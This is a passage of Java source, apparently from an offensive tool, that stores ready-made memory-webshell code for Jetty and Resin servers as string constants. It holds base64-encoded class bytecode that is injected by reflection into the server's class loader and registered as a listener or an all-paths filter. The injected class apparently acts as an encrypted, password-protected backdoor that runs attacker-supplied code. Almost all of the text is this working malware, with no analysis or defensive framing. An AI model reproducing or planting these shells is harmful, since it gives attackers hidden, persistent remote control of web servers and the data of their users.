FyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAFaAVsMAVwBXQwBXgFfBwFgDAFhAWIMAWMBMQwAjwCQDAFeAT8BAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAWQAcQwBZQFmAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFnAUkMAHABYgcBJwwBaAFpDAFqAWsBAAhfY2hhbm5lbAwArACtAQAJX3Jlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDspVgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAC3RvQnl0ZUFycmF5AQAPcHJpbnRTdGFja1RyYWNlAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2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\");\n" +
            "                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "                MEMSHELL_OBJECT = var3.newInstance();\n" +
            "            } catch (Exception var4) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    static{\n" +
            "        new JettyListenerMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String ResinFilterMemShell =
            "import javax.servlet.Filter;\n" +
            "import javax.servlet.ServletContext;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "\n" +
            "public class ResinFilterMemShell {\n" +
            "\n" +
            "    static {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "    public ResinFilterMemShell() {\n" +
            "        Inject();\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized void Inject() {\n" +
            "        try {\n" +
            "            String filterName = \"memshell.ResinFilterShell\";\n" +
            "            String urlPattern = \"/*\";\n" +
            "\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            Class servletInvocation = classLoader.loadClass(\"com.caucho.server.dispatch.ServletInvocation\");\n" +
            "\n" +
            "            Object contextRequest = servletInvocation.getMethod(\"getContextRequest\").invoke(null);\n" +
            "            Object webapp = contextRequest.getClass().getMethod(\"getWebApp\").invoke(contextRequest);\n" +
            "            Class<?> FilterConfigImplClass = classLoader.loadClass(\"com.caucho.server.dispatch.FilterConfigImpl\");\n" +
            "            String FilterBase64 = \"yv66vgAAADMBhgoAZwDYCQBSANkJAFIA2ggA2wkAUgDcCADdCQBSAN4IAN8JAFIA4AcA4QoACgDYCgAKAOIKAAoA4woAUgDkCQBSAOUIAOYJAFIA5woAZwDoCgBnAOkIAOoKAOsA7AcA7QoAMQDuCgAWAO8KAOsA8AoA6wDxBwDyCADzCgD0APUKADEA9goA9AD3BwD4CgD0APkKACAA+goAIAD7CgAxAPwIAP0KAC4A/ggA/wcAtAoALgEABwC9CgEBAQIKADABAwgBBAcBBQcAgAcBBgcBBwgBCAoALgEJCAEKCAELCAEMCAENCAEOCgAuAQ8HARAKAC4BEQoAOgESCgA/ARMKAD8BFAcBFQoALgEWBwEXCgBBANgKAEEBGAoAQQEZCgBSARoHARsHARwIAR0LAEYBHggBHwoAMQEgCwBGASELAEYBIgoAUgEjCgBSASQIASULASYBJwcBKAoALgEpCgBSAOgKAFIBKgsBJgErCACzCwBGASsHASwKAFkA2AoAMAEtCwBHAS4KADEBLwoBMAExCgAwAOMKAFkBMgoAUgEzCgAxATQIATUIATYLATcBOAoAGwE5BwE6BwE7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABtMbWVtc2hlbGwvUmVzaW5GaWx0ZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHASgHATwHAPIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwEHAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAAW8BAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABWNsYXp6BwEVBwEFBwEQAQANZ2V0RmllbGRWYWx1ZQEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQADb2JqAQAJZmllbGROYW1lBwE9AQAQZ2V0TWV0aG9kQnlDbGFzcwEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACm1ldGhvZE5hbWUBAApwYXJhbWV0ZXJzAQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAGaW52b2tlAQBLKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQACbzEBAAFpAQABSQEAB2NsYXNzZXMBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAR2YXI3AQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBFwcBBgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBPgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAARkYXRhAQAEdmFyOQEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwE/BwFAAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABVSZXNpbkZpbHRlclNoZWxsLmphdmEMAHMAdAwAaQBqDABrAGwBABAzYzZlMGI4YTljMTUyMjRhDABtAG4BAARwQVMzDABvAG4BABAvZmF2aWNvbmRlbW8uaWNvDABwAG4BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBQQFCDAFDAUQMAHEAjgwAcQBuAQAFVVRGLTgMAHIAbgwAcwB6DAFFAUYBAANBRVMHATwMAUcBSAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAUkBSgwAcwFLDADAAUwMAU0BTgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAU8MAUcBUAwBUQFSDAFTAVQBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBVQFKDABzAVYMAUMBVwwBWAFEAQAQamF2YS51dGlsLkJhc2U2NAwBWQFaAQAKZ2V0RW5jb2RlcgwBWwFcBwE9DAC1AV0MAV4BXwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFgAWEBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBYgFjAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFkAV8MAHMBZQwBZgFnDAFoAWkBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAwBagFcAQATamF2YS91dGlsL0FycmF5TGlzdAwBawFsDAFtAW4MALAAsQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEFgtUmVxdWVzdGVkLVdpdGgMAW8AjgEADlhNTEhUVFBSZXF1ZXN0DAFwAXEMAXIBcwwBdACODACcAJ0MAIEAggEAEG1lbXNoZWxsLnBheWxvYWQHAT8MAXUBdgEAGW1lbXNoZWxsL1Jlc2luRmlsdGVyU2hlbGwMAXcBeAwAfQB+DAF5AXoBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBewFsDAF8AX0MAX4BfwcBgAwBgQFlDAGCAUoMAJIAkwwBfgFXAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwGDDADFAYQMAYUAdAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAd0b0FycmF5AQAoKFtMamF2YS9sYW5nL09iamVjdDspW0xqYXZhL2xhbmcvT2JqZWN0OwEACWdldEhlYWRlcgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGZXF1YWxzAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQALdG9CeXRlQXJyYXkBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAD3ByaW50U3RhY2tUcmFjZQAhAFIAZwABAGgABwABAGkAagAAAAEAawBsAAAAAABtAG4AAAABAG8AbgAAAAEAcABuAAAAAABxAG4AAAABAHIAbgAAAA4AAQBzAHQAAQB1AAAAkAADAAEAAABGKrcAASoBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAkquwAKWbcACyq0AAe2AAwqtAAFtgAMtgANuAAOtQAPKhIQtQARsQAAAAIAdgAAACYACQAAABwABAAUAAkAFQAOABYAFAAXABoAGAAgAB0APwAeAEUAHwB3AAAADAABAAAARgB4AHkAAAABAHMAegABAHUAAACbAAMAAgAAAEcqK7cAEioBtQACKgG1AAMqEgS1AAUqEga1AAcqEgi1AAkquwAKWbcACyq0AAe2AAwqtAAFtgAMtgANuAAOtQAPKhIQtQARsQAAAAIAdgAAACYACQAAACMABQAUAAoAFQAPABYAFQAXABsAGAAhACQAQAAlAEYAJgB3AAAAFgACAAAARwB4AHkAAAAAAEcAewB8AAEAAQB9AH4AAQB1AAAAPQAEAAIAAAAJKisDK763ABOwAAAAAgB2AAAABgABAAAAKQB3AAAAFgACAAAACQB4AHkAAAAAAAkAfwCAAAEAAQCBAIIAAQB1AAAA2AAGAAQAAAAsEhS4ABVOLRyZAAcEpwAEBbsAFlkqtAAFtgAXEhS3ABi2ABktK7YAGrBOAbAAAQAAACgAKQAbAAMAdgAAABYABQAAAC4ABgAvACMAMAApADEAKgAyAHcAAAA0AAUABgAjAIMAhAADACoAAgCFAIYAAwAAACwAeAB5AAAAAAAsAIcAgAABAAAALACIAIkAAgCKAAAAPAAD/wAPAAQHAIsHAC8BBwCMAAEHAIz/AAAABAcAiwcALwEHAIwAAgcAjAH/ABgAAwcAiwcALwEAAQcAjQAJAHEAjgABAHUAAACnAAQAAwAAADABTBIcuAAdTSwqtgAXAyq2AB62AB+7ACBZBCy2ACG3ACIQELYAI7YAJEynAARNK7AAAQACACoALQAbAAMAdgAAAB4ABwAAADcAAgA6AAgAOwAVADwAKgA+AC0APQAuAEAAdwAAACAAAwAIACIAiACPAAIAAAAwAIcAbgAAAAIALgCQAG4AAQCKAAAAEwAC/wAtAAIHAJEHAJEAAQcAjQAACQCSAJMAAgB1AAABSQAGAAUAAAB4AUwSJbgAJk0sEicBwAAotgApLAHAACq2ACtOLbYALBItBL0ALlkDEi9TtgApLQS9ADBZAypTtgArwAAxTKcAOU4SMrgAJk0stgAzOgQZBLYALBI0BL0ALlkDEi9TtgApGQQEvQAwWQMqU7YAK8AAMUynAAU6BCuwAAIAAgA9AEAAGwBBAHEAdAAbAAMAdgAAADIADAAAAEQAAgBIAAgASQAbAEoAPQBSAEAASwBBAE0ARwBOAE0ATwBxAFEAdABQAHYAVAB3AAAASAAHABsAIgCUAJUAAwAIADgAlgCXAAIATQAkAJQAlQAEAEcALQCWAJcAAgBBADUAmACGAAMAAAB4AJkAgAAAAAIAdgCaAG4AAQCKAAAAKQAD/wBAAAIHAC8HAJEAAQcAjf8AMwAEBwAvBwCRAAcAjQABBwCN+QABAJsAAAAEAAEAGwAJAJwAnQACAHUAAAFVAAYABQAAAIQBTBIluAAmTSwSNQHAACi2ACksAcAAKrYAK04ttgAsEjYEvQAuWQMSMVO2ACktBL0AMFkDKlO2ACvAAC/AAC/AAC9MpwA/ThI3uAAmTSy2ADM6BBkEtgAsEjgEvQAuWQMSMVO2ACkZBAS9ADBZAypTtgArwAAvwAAvwAAvTKcABToEK7AAAgACAEMARgAbAEcAfQCAABsAAwB2AAAAMgAMAAAAWAACAFwACABdABsAXgBDAGYARgBfAEcAYQBNAGIAUwBjAH0AZQCAAGQAggBoAHcAAABIAAcAGwAoAJ4AlQADAAgAPgCWAJcAAgBTACoAngCVAAQATQAzAJYAlwACAEcAOwCYAIYAAwAAAIQAmQBuAAAAAgCCAJoAgAABAIoAAAApAAP/AEYAAgcAkQcALwABBw